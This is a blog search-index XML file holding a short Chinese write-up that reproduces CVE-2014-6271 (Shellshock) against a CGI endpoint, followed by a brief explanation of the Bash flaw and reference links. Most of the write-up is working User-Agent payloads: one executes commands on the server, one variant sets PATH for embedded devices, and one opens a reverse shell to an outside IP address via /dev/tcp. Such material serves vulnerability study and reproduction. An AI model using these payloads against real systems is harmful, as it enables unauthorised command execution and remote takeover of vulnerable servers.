<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2020/11/09/cve-2014-6271/"/>
      <url>/2020/11/09/cve-2014-6271/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2014-6271"><a href="#CVE-2014-6271" class="headerlink" title="CVE-2014-6271"></a>CVE-2014-6271</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>访问<a href="http://ip:port/cgi-bin/poc.cgi,修改UA字段执行命令" target="_blank" rel="noopener">http://ip:port/cgi-bin/poc.cgi,修改UA字段执行命令</a><br>命令执行：User-Agent: () { :;};echo ; echo; echo $(/bin/ls -al /);<br>反弹shell：User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/108.160.128.46/8888 0&gt;&amp;1;<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/0dda8ca45ef31539.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/b77a81a4751b0af8.png" alt=""></p><p>注意：部分嵌入式设备的环境变量未设置会导致一些命令需要使用绝对路径，可在执行命令前导入环境变量。</p><figure class="highlight elixir"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-<span class="symbol">Agent:</span> () { <span class="symbol">:</span>;};echo ; echo; export PATH=<span class="variable">$PATH</span><span class="symbol">:/usr/local/sbin</span><span class="symbol">:/usr/local/bin</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/bin</span><span class="symbol">:/sbin</span><span class="symbol">:/bin</span>; echo <span class="variable">$(</span>/bin/ls -al /);</span><br></pre></td></tr></tbody></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>旧版本Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。主要原因在于输入过滤中没有严格限制边界，也没有做出合法化的参数判断。<br>此漏洞属于Bash漏洞，本身并不能导致远程代码执行，需要在第三方服务程序作为媒介，如apache2的CGI组件</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/news/48331.html" target="_blank" rel="noopener">https://www.freebuf.com/news/48331.html</a><br><a href="https://www.antiy.com/response/CVE-2014-6271.html" target="_blank" rel="noopener">https://www.antiy.com/response/CVE-2014-6271.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
